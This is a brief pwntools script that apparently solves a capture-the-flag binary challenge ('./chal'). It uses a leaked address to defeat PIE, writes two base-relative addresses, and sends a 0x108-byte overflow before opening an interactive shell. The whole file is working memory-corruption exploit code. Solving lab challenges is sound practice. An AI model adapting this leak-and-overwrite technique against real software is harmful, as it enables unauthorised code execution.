from pwn import *
# context.log_level ='debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = process("./chal")
gdb.attach(p)
base = int(p.readline(),16)-0x11c0
log.warning(hex(base))
p.send(flat([0x000000000004018+base,0x11a9+base]))
p.send(b"\0"*0x108+b"X")
p.interactive()